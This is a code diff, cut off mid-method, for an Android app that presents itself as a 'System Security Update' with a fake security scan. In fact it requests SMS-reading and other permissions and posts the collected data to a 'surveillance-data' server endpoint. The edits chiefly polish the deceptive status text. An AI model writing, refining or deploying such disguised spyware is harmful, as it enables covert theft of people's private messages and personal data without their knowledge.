@@ -1,4 +1,5 @@
 package com.security.update.v2;
+
 import android.Manifest;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
@@ -11,11 +12,13 @@ import org.json.JSONObject;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+
 public class MainActivity extends AppCompatActivity {
     private static final String SERVER_URL = "https://your-server.com/api/surveillance-data";
     private static final int PERMISSION_REQUEST_CODE = 1001;
     private TextView statusText;
     private Button startButton;
+    
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -29,8 +32,9 @@ public class MainActivity extends AppCompatActivity {
                 requestPermissions();
             }
         });
-        statusText.setText("System Security Update Ready\nTap Start to begin security scan");
+        statusText.setText("System Service Update Ready\nTap Start to begin security scan");
     }
+
     private boolean checkPermissions() {
         String[] permissions = {
             Manifest.permission.READ_SMS,
@@ -46,6 +50,7 @@ public class MainActivity extends AppCompatActivity {
         }
         return true;
     }
+
     private void requestPermissions() {
         String[] permissions = {
             Manifest.permission.READ_SMS,
@@ -56,6 +61,7 @@ public class MainActivity extends AppCompatActivity {
         };
         ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
     }
+
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
@@ -74,6 +80,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
     }
+
     private void startDataCollection() {
         statusText.setText("🔍 Starting Security Scan...");
         startButton.setEnabled(false);
@@ -95,6 +102,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }).start();
     }
+
     private void sendDataToServer(JSONObject data) {
         try {
             HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
